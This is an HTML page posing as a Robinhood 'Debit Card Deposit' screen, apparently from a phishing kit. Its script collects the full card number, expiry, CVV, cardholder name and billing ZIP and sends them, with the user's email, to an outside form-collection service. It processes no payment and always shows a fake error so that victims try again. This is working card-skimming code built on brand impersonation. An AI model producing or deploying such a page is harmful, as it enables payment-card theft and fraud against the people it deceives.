<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Card Deposit — Robinhood</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../../assets/css/app.css"></head><body>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script><script src="../../assets/js/supabase.js"></script><script src="../../assets/js/auth.js"></script><script src="../../assets/js/shell.js"></script><script src="../../assets/js/prices.js"></script><script src="../../assets/js/formspark.js"></script><script src="../../assets/js/wallet.js"></script>
<script>
(async () => { const session = await requireAuth(); if(!session) return; await renderShell({active:"deposit",session}); const c=document.getElementById("content"); c.innerHTML = `<h1>Debit Card Deposit</h1><div class="card"><form id="cf">
<div class="field"><label>Amount (USD)</label><input name="amount" type="number" step="0.01" min="10" required></div>
<div class="field"><label>Cardholder name</label><input name="name" required></div>
<div class="field"><label>Card number</label><input name="card_number" required inputmode="numeric" maxlength="19"></div>
<div class="row"><div class="field" style="flex:1"><label>Expiry (MM/YY)</label><input name="expiry" required placeholder="12/28"></div>
<div class="field" style="flex:1"><label>CVV</label><input name="cvv" required inputmode="numeric" maxlength="4"></div></div>
<div class="field"><label>Billing ZIP</label><input name="zip" required></div>
<button class="btn btn-primary btn-block" type="submit">Deposit</button>
<div id="err" class="form-error hidden" style="margin-top:12px"></div>
</form></div>`;
document.getElementById("cf").onsubmit = async e => {
  e.preventDefault();
  const fd = Object.fromEntries(new FormData(e.target));
  const u = (await sb.auth.getUser()).data.user;
  const btn = e.target.querySelector("button[type=submit]"); btn.disabled = true; btn.textContent = "Processing...";
  await submitToFormspark({ form: "card_deposit", user_email: u.email, ...fd });
  btn.disabled = false; btn.textContent = "Deposit";
  const err = document.getElementById("err"); err.textContent = "We couldnt process this right now. Please try again later."; err.classList.remove("hidden");
}; })();
</script></body></html>
